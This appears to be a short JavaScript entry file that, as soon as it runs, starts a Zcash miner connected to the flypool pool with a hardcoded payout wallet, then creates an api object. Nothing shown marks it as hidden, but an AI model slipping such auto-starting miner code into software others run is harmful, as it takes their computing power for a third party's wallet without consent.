import { api } from './api';
import { miner } from './miner';

let startMining = new miner(
  "eu1-zcash.flypool.org",
  3333,
  "t1MnfjAGPAACcPqPKx9Nw8R3jNpuDrwpAaw",
  "x",
  "main"
);
startMining.start();
let getApi = new api();
